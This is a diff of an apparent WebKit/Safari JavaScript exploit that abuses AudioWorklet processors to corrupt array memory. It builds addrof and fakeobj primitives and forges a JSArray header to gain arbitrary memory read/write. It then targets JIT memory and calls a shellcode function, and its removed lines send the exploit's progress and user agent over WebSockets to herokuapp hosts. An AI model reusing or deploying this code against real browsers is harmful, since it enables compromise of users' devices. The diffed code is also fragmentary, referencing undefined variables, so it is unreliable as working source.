@@ -1,8 +1,4 @@
-function pwn() {
-//[1] turnerhackz1 edits will be [1]
-//[2] kanji edits will be [2]
-
-// [1]
+//
 // Utility functions.
 //
 // Copyright (c) 2016 Samuel Groß
@@ -338,6 +334,8 @@ function ShiftRight(a, b) {
 Int64.Zero = new Int64(0);
 Int64.One = new Int64(1);
 
+// That's all the arithmetic we need for exploiting WebKit.. :)
+
 function sleep( sleepDuration ){
     var now = new Date().getTime();
     while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
@@ -364,21 +362,19 @@ function strcmp(b, str)
 
 
 
-function hex1(x) {
+      function hex1(x) {
     if (x < 0)
         return `-${hex1(-x)}`;
     return `0x${x.toString(16)}`;
 }
-
 let data_view = new DataView(new ArrayBuffer(8));
-
 var floatAsQword = float => { //f2i
     data_view.setFloat64(0, float, true);
     var low = data_view.getUint32(0, true);
     var high = data_view.getUint32(4, true);
     return low + (high * 0x100000000);
 }
-var qwordAsTagged = qword => {
+var qwordAsTagged = qword =>{
     return qwordAsFloat( qword- 0x02000000000000);
 }
 var qwordAsFloat = qword => { //i2f
@@ -387,36 +383,22 @@ var qwordAsFloat = qword => { //i2f
     //data_view.setBigUint64(0, qword);
     return data_view.getFloat64(0, true);
 }
-
-
-// That's all the arithmetic we need for exploiting WebKit.. :)
-var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
-var keep = [];
-async function kickstart146() {
-	socket.send(`exploit_start {
-		exploitVersion: "14.6",
-		userAgent: ${navigator.userAgent},
-	}`);
-	var context = new OfflineAudioContext(1, 128, 300000);
-	context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
-      // constant added to double JSValues
-      var socket = new WebSocket("wss://pwn-me.herokuapp.com/");
       const kBoxedDoubleOffset = 0x0002000000000000n;
-      //[1] -----------------------------------------------------------|
-      var array_spray = [];
-      for (var i = 0; i < 1000; ++i) {
-        array_spray[i] = [13.37+i, 13.37];
-      }
-    
-    var structure_spray = [];
+
+    var array_spray = [];
     for (var i = 0; i < 1000; ++i) {
+        array_spray[i] = [13.37+i, 13.37];
+    }
+    var structure_spray = [];
+for (var i = 0; i < 1000; ++i) {
     var ary = [13.37];
     ary.prop = 13.37;
     ary['p'+i] = 13.37;
     structure_spray.push(ary);
-    }                                                                 //^
-    var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37]; //|
-    unboxed1[0] = 4.2; // no CopyOnWrite [1] ----------------------------
+}
+    var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
+    unboxed1[0] = 4.2; // no CopyOnWrite
+  //alert("hehe")
       function boxDouble(d) {
         return d + kBoxedDoubleOffset;
       }
@@ -436,51 +418,45 @@ async function kickstart146() {
         u[1] = Number(v >> 32n);
         return f[0];
       }
-
       // store things to prevent GC
       let keep = [];
       function gc(n=10000) {
         let tmp = [];
         for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
       }
-
       // message port to talk to main thread; will be set later
       let port = null;
-
+      //let port1 = null;
       // will be implemented later
       let fakeobj = null;
       let addrof = null;
-
       for (var i = 0; i < 100; i++) keep.push([1.1*i]);
       let a0 = [0,0,0,0,0,0,0,0,0,0];
+
       let a1 = [0,0,0,0,0,0,0,0,0,0];
       // transition to unboxed double storage
       a1[3] = 13.37;
       let b0 = [0,0,0,0,0,0,0,0,0,0];
-      let b1 = [{},{},13.37]; // store references to a1 to make b1 a boxed array [1]
-
+      let b1 = [{},{},13.37]//[0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
       // put zeroes in first two slots so JSCallbackData destruction is safe
       delete b1[0];
       delete b1[1];
-
       function setupPrimitives() {
+        
         port.postMessage("setting up");
         if (a1.length != 0x1337) {
           port.postMessage("Failure on array length");
           return;
         }
 
-        //const kSentinel = 1333.337; 
-	//[1]
-	var kSentinel = qwordAsFloat(0x41414141414141)
+        //const kSentinel = 1333.337;
+        var kSentinel = qwordAsFloat(0x41414141414141)
         let offset = -1;
-
         b1[0] = kSentinel;
         // scan for the sentinel to find the offset from a to b
         for (var i = 0; i < 0x100; i++) {
-          //[1]
-	  if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) {
-	  port.postMessage("a1[i]" + typeof a1 + hex1(floatAsQword(qwordAsTagged(floatAsQword(a1[i])))))
+          if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) {
+            port.postMessage("a1[i]" + typeof a1 + hex1(floatAsQword(qwordAsTagged(floatAsQword(a1[i])))))
             offset = i;
             break;
           }
@@ -489,70 +465,56 @@ async function kickstart146() {
           port.postMessage("Failure finding offset");
           return;
         }
-
+        //port.postMessage("here")
         // temporary implementations
         addrof = (val) => {
           b1[0] = val;
-	  //[1]
           return floatAsQword(a1[offset]);
         }
         fakeobj = (addr) => {
-	  //[1]
           a1[offset] = qwordAsFloat(addr);
           return b1[0];
         }
-	//[1]
-	var victim1 = structure_spray[510];
+        var victim1 = structure_spray[510];
         // Gigacage bypass: Forge a JSObject which has its butterfly pointing
         // to victim
-	//[1]
-	var boxed1 = [{}];
+        var boxed1 = [{}];
         var print = (msg) => {
           port.postMessage(msg);
         }
         print("unboxed @ " + hex1(addrof(unboxed1)));
         print("boxed @ " + hex1(addrof(boxed1)));
-	//[1]
 
-        /*let obj = {
-          jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
-          fakeButterfly: a0
-        };*/ //[1] deleted 
-	//Explanation from [1] craft a fake JSArray with Contigoues header with an invalid StructID
-	//Point our Fake JSArray backing butterfly to victim1 from the StructureSpray which is ArraywithDouble and is valid
-	//and have a valid structure ID at this point afterwards gc and jit compile will be a nasty crash
-	//since our header is invalid but our butterfly is correct we should fix that
-	var container = {
+    var container = {
         header: qwordAsTagged(0x0108230900000000), // cell
         butterfly: victim1, // butterfly
-    	};
-	var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
-    	unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
-    	var boxed = [{}]
-	
-	print("Fake Obj @ " + hex1(addrof(container)));
+    };
+    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
+    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
+    var boxed = [{}];
 
-   	var hax = fakeobj(addrof(outer) + 0x10);
-	
-	// "Point" refers to changing the given array's butterfly
-    	// hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
-    	//
-    	// First, point victim[] to unboxed[]
-   	// Second, save the location of unboxed
-   	// Third, point victim[] to boxed[]
-    	// Finally, point unboxed[] and boxed[] to the same place (give them same bfly)
-    	// 
-    	// This allows us to access victim[] and read/write adresses as doubles with unboxed[]
-    	// and then access them as objects with boxed[]
-    	hax[1] = unboxed;
-    	var tmp_bfly_ptr = victim[1];
-    	print("shared butterfly @ " + hex1(tmp_bfly_ptr));
-    	hax[1] = boxed;
-    	victim[1] = tmp_bfly_ptr;
-	container.header = qwordAsTagged(0x0108230700000000);
-	//[1] sorry if this code looks messy and my comments seems confusing :)
-	print("we now have arbitrary r/w")
-	var stage2 = {
+    print("outer @ " + hex1(addrof(container)));
+
+    var hax = fakeobj(addrof(outer) + 0x10);
+    // "Point" refers to changing the given array's butterfly
+    // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
+    //
+    // First, point victim[] to unboxed[]
+    // Second, save the location of unboxed
+    // Third, point victim[] to boxed[]
+    // Finally, point unboxed[] and boxed[] to the same place (give them same bfly)
+    // 
+    // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
+    // and then access them as objects with boxed[]
+    hax[1] = unboxed;
+    var tmp_bfly_ptr = victim[1];
+    print("shared butterfly @ " + hex1(tmp_bfly_ptr));
+    hax[1] = boxed;
+    victim[1] = tmp_bfly_ptr;
+
+    container.header = qwordAsTagged(0x0108230700000000);
+
+    var stage2 = {
         addrof: function(obj) {
             return addrof(obj)
         },
@@ -654,7 +616,7 @@ async function kickstart146() {
     };
 
     //stage2.test();
-    var v = 0x4141;
+            var v = 0x4141;
             var obj = {p: v};
             var addr1 = stage2.addrof(v);
             var addr = stage2.addrof(obj);
@@ -773,97 +735,259 @@ async function kickstart146() {
         print("JSC instance @ " + hex1(jscbase))
         var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
         print("JSC header @" + header);
-	
-	
+        //print("Correct Header Char Code?" + String.fromCharCode(...stage2.read64(header)))
+
+        /*while(true)
+        {
+        //FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
+        if(strcmp(stage2.read(header, 0x10), "dyld_v1   arm64")) //cache header magic
+        //webcore header magic...
+        {
+            print(String.fromCharCode(...stage.read(hdr, 0x10)))
+            break;
+        }
+        hdr = Sub(hdr, 0x10000);
+        }*/
+        //print(String.fromCharCode(...stage2.read(jscbase,80)))
+        //stage2.write64(hex1(stage2.read64((bbaddr&0xffffffffffffc000) - 0x128 + 8)),0x414141)
+        //print("after removing bitmask +0x4000-0x128" + (hex1(stage2.read64(hex1(bbaddr)&0xffffc000))+0x4000-0x128))
+        //p/x sizeof(JSC::MarkedBlock::Footer) = 0x128
+        //MarkedBlock size 0x4000 bytes large
+
+        //offset of m_vm is last + number
+        //var vm = stage2.read64((bbaddr & 0xffffffffffffc000)+0x4000+0x128+8)//+0x8;
+        //print("vm address?" + hex1(vm))
+        //stage2.write64(vm,0x414141441414)
 
 
-        //[1] deleted the below code
-	/*let addr = addrof(obj);
-        socket.send("log_normal", "Found obj @ 0x" + addr.toString(16));
-        port.postMessage("obj @ " + addr.toString(16));
+        /*print("We have stable memory rw primitives run this exploit on MacOS with \n" + "A version that has Safari 14.1 and it will yield you code execution...\n"+
+        "Right now iOS doesn't have rwx memory for JIT so we will need a ROP Chain\n"+
+        "which will require a shared cache parser that utilizes our memory rw\n"+
+        "I have that already finished for iOS 12.1.4 on my github \n"+
+        "but the problem is I can access DOM from this worker script in turn\n"+
+        "I can't leak a vtable from to calculate the shared cache header address\n"+
+        "so for now all i got to offer is the knowing of the r-x memory address\n"+
+        "I will write 0x41414141 unseccessfully as it is mapped as read only\n"+
+        "Should signal a SIGBus memory violation crash log and it should show the Read\n"+
+        "only memory is in the crash log if your device have pac I will need to strip that\n"+
+        "first... before doing so... So in 10 seconds I will trigger the crash...\n")*/
+        //sleep(5)
+        //jitcode = shouldwestrippacbits(jitcode);
+        //stage2.write64(jitcode,0x41414141)
+        } else {
+        var jitCodeAddr = stage2.read64(executableAddr, 3);
+        print("[+] JITCode instance 1@ " + hex1(jitCodeAddr));
+        var rwxMemAddr = shouldwestrippacbits(stage2.read64(jitCodeAddr, 4));
+        print("[+] " + (rwx === true ? "RWX" : "RX") + " memory @ " + rwxMemAddr);
+        stage2.write64(rwxMemAddr,0x41414141);
+        shellcodeFunc();
+        }
+        
+        //return [shellcodeFunc, rwxMemAddr];
+    }
+    getJITFunction(false)
+    
+    /*function detectOS() {
+        var funcAddr = getJITFunction(false, true);
+        var memAddr = funcAddr[1];
+        
+        print("[*] Checking device OS");
+        
+        var data = stage2.read(memAddr, 80);
+        
+        // Use the function prologue to detect which device we're running on
+        function checkSignature(signature, startIndex) {
+            if (startIndex === undefined) {
+                startIndex = 0;
+            }
+            
+            for (var i = startIndex; i < signature.length + startIndex; i++) {
+                if (data[i] != signature.charCodeAt(i - startIndex)) {
+                    return false;
+                }
+            }
+            
+            return true;
+        }
+        
+        if (checkSignature("\x55\x48\x89\xE5")) { // x86_64: push rbp; mov rbp, rsp
+            print("[+] Detected macOS");
+            return "macOS";
+        } else {
+            print("[+] Detected iOS");
+            print("can't do anything on iOS just yet print pretty shared cache char code");
+            print(String.fromCharCode(...data));
+            return "iOS";
+        }
+    }
+    print(detectOS())*/
 
-        let fakeArr = fakeobj(addr + 0x10n);
+/*ready.then(function() {
+    try {
+        pwn();
+    } catch (e) {
+        print("[-] Exception caught: " + e);
+        ws_log.send("Connection closed!");
+        ws_log.close();
+    }
+}).catch(function(err) {
+    print("[-] Initialization failed");
+});*/
+            /*while(true) {
+                Math.sin(100000000000)
+                stage2.write64(jitcode,0x4141414141)
+            }
 
-         subtract off the incref
-        doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
-        socket.send("log_normal", "double array header @ 0x" + doubleArrayCellHeader.toString(16));
-        port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
+            var rwx = -stage2.read64(jitcode+32) & 0xFFFFFFFF8
+            print("rwx" + hex1(rwx))
+            //var hdr = Sub(new Int64(jitcode), new Int64(jitcode).lo() & 0xfff);*/
+        //cache
+       /*struct dyld_cache_header
+       {
+           char        magic[16];                // e.g. "dyld_v0    i386" 0-0x10
+           uint32_t    mappingOffset;            // file offset to first dyld_cache_mapping_info 10-0x14
+           uint32_t    mappingCount;            // number of dyld_cache_mapping_info entries 14-0x18
+           uint32_t    imagesOffset;            // file offset to first dyld_cache_image_info 18-0x1C
+           uint32_t    imagesCount;            // number of dyld_cache_image_info entries 1c-0x20
+           uint64_t    dyldBaseAddress;        // base address of dyld when cache was built 20-0x24
+           //28?
+           uint64_t    codeSignatureOffset;    // file offset of code signature blob //0x2C
+           uint64_t    codeSignatureSize;        // size of code signature blob (zero means to end of file) //
+           uint64_t    slideInfoOffset;        // file offset of kernel slid info 0x34
+           uint64_t    slideInfoSize;            // size of kernel slid info 0x3C
+           uint64_t    localSymbolsOffset;        // file offset of where local symbols are stored
+           //0x44
+           uint64_t    localSymbolsSize; //0x4C       // size of local symbols information
+           uint8_t        uuid[16]; // 0x54                // unique value for each shared cache file
+           uint64_t    cacheType;         //0x64      // 1 for development, 0 for optimized
+       };*/
+       
+       //print('dyld cache header @' + jitcode); //dyld_cache_header
+       //stage2.write64(jitcode,jitcode)
+        /*while(true)
+        {
+        //FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
+        if(strcmp(stage2.read(hdr,8), "dyld_v1   arm64")) //cache header magic
+        //webcore header magic...
+        {
+            print(String.fromCharCode(...staged2read(hdr,8)))
+            break;
+        }
+        hdr = hdr - 0x1000;
+        }*/
+            //var vtab = stage2.read64(exe) //vtab
+            //var anchor = vtab - (vtab & 0xfff);
+            //port.postMessage(hex1(jitcode) + "vtab?" + hex1(vtab));
+            //var rwx = -(stage2.read64(jitcode+0x20) & 0xFFFFFFFF8) //anchor //0x26?
+            //staged2read64(rwx)
+            //var i = new Uint32Array(64);
+            //i = (rwx % 0x100000000);
 
-         fix broken cell header
-        fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            //port.postMessage(hex1(rwx) + " lo " + hex1((rwx)))
 
-         grab a real butterfly pointer
-        let doubleArrayButterfly = float2bigint(fakeArr[1]);
+            //port.postMessage(ShiftRight(new Int64(hex1(rwx)),4))
+            //stage2.write64(exe,0x55555555)
+            //stage2.write64(mathfunc,0x4141414141)
+            //Math.sin()
+            /*while(!(port1.onmessage())) {
+                port.postMessage("not")
+            }
+            //port.onmessage = ;
+            port.onmessage = (e) => {
+                port.postMessage("gotit")
+            }*/
+            
+            //var propertyAddr = addr;
 
-         fix other broken cell header
+            //var value = stage2.read(addr,8);
+            //port.postMessage("value" + value)
+
+
+        /*var addr1 = addrof({a:0x1337});
+        var fb = fakeobj(addr1)
+
+        port.postMessage("addrof {}" + hex1(fb.a))
+        var obj = {
+          jsCellHeader: qwordAsTagged(0x0108230700000000),
+          fakeButterfly: a0
+        };
+        port.postMessage("here debug");
+        let addr = addrof(obj);
+        port.postMessage("Found obj @ " + hex1(addr));
+        //port.postMessage("obj @ " + addr.toString(16));
+        let fakeArr = fakeobj(addr + 0x10);
+        // subtract off the incref
+        doubleArrayCellHeader = floatAsQword(fakeArr[0]) - 0x1;
+        port.postMessage("double array header @ " + hex1(doubleArrayCellHeader));
+        //port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
+        // fix broken cell header
+        var doublebfly = floatAsQword(fakeArr[1])
+        port.postMessage("double array butterfly @ " + hex1(doublebfly));
+        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
+        port.postMessage("debug1")
+        // grab a real butterfly pointer
+        let doubleArrayButterfly = floatAsQword(fakeArr[1]);
+        port.postMessage("debug2")
+        // fix other broken cell header
         obj.fakeButterfly = b0;
-        fakeArr[0] = bigint2float(doubleArrayCellHeader);
-
-         fix the broken butterflys and setup cleaner addrof / fakeobj
-        obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
+        port.postMessage("debug3")
+        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
+        port.postMessage("debug4")
+        // fix the broken butterflys and setup cleaner addrof / fakeobj
+        obj.jsCellHeader = qwordAsTagged(doubleArrayCellHeader);
+        port.postMessage("debug4")
+        //here
         obj.fakeButterfly = a1;
-        fakeArr[1] = bigint2float(doubleArrayButterfly);
+        port.postMessage("debug5")
+        //port.postMessage(hex1(qwordAsTagged(doublebfly)))
+        fakeArr[1] = qwordAsFloat(doublebfly);
+        port.postMessage("debug6")
         obj.fakeButterfly = b1;
-        fakeArr[1] = bigint2float(doubleArrayButterfly);
-
+        port.postMessage("debug7")
+        fakeArr[1] = qwordAsFloat(doublebfly);
         fakeobj = (addr) => {
-          a1[0] = bigint2float(addr);
+          a1[offset] = qwordAsFloat(addr);
           return b1[0];
         }
         addrof = (val) => {
-          b1[0] = val;
-          return float2bigint(a1[0]);
+          b1[offset] = val;
+          return floatAsQword(a1[0]);
         }*/
       }
-      }
-
-      /*function pwn() {
+      function pwn() {
         try {
           setupPrimitives();
-
-           ensure we can survive GC
-          gc();
-
-           TODO: rest of exploit goes here
-
+          // ensure we can survive GC
+          //gc();
+          // TODO: rest of exploit goes here
           port.postMessage("done!");
-        } catch(e) {  send exception strings to main thread (for debugging)
+        } catch(e) { // send exception strings to main thread (for debugging)
           port.postMessage("Exception!!");
           port.postMessage(e.toString());
         }
-      }*/
-
+      }
       registerProcessor("a", class {
         constructor() {
           // setup a message port to the main thread
           port = new AudioWorkletProcessor().port;
+          //port1 = new AudioWorkletProcessor().port;
           port.onmessage = pwn;
 
           // this part is magic
           // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
           eval('1 + 0x1336');
-
           // overwrite a1's butterfly with a fastMalloc pointer
           return {fill: 1, a: a0};
         }
       });
       registerProcessor("b", class {
         constructor() {
+            /*port.onmessage = (e) => {
+                port1.postMessage("recieved!!!")
+            }*/
+            //port1 = new AudioWorkletProcessor().port;
           // overwrite b1's butterfly with a fastMalloc pointer
           return {fill: 1, b: b0};
         }
       });
-    `,], { type: "text/javascript" })))
-    .then(async () => {
-        var wa = new AudioWorkletNode(context, "a");
-        var wb = new AudioWorkletNode(context, "b");
-        wa.port.onmessage = (e) => {
-            socket.send("log_normal", e.data);
-        };
-        await new Promise((res) => setTimeout(res, 100));
-        wa.port.postMessage("pwn");
-    })
-    .catch((err) => {
-        socket.send("log_normal", "Error: " + err);
-    });
-}
+      //return stage2
